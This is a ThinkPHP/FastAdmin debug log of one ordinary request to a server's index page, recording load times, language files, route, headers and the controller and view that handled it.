[ info ] 118.24.114.43:8080/ [运行时间：0.005252s][吞吐率：190.40req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003376s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000105s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
